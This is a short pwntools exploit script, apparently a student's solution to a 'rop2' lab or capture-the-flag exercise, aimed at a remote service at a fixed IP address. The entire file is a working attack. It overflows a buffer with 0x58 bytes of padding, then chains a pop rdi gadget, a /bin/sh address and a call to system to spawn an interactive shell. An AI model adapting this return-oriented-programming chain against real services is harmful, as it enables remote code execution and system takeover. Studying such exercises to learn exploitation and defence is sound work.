from pwn import *

context.log_level = 'DEBUG' # set debug logging
context.arch = 'amd64'
# p = process("./rop2")
p = remote("8.154.20.109", 10101)
binary = ELF("./rop2")
rop = ROP(binary)
p.recvuntil(b"Please input your StudentID:\n")
p.sendline(b"3220103544")

ret_addr = 0x00444a40
bin_sh_addr = 0x006d50f0
pop_rdi_addr = 0x00400716


payload = b''
payload += b"A" * 0x58
payload += p64(pop_rdi_addr) # pop rdi ; ret
payload += p64(bin_sh_addr) # @ .data
payload += p64(ret_addr)
payload += p64(binary.sym["system"])

p.sendlineafter(b"[*] Please input the length of data:\n", str(len(payload)))
p.sendlineafter(b"[*] Please input the data:\n", payload)

p.interactive()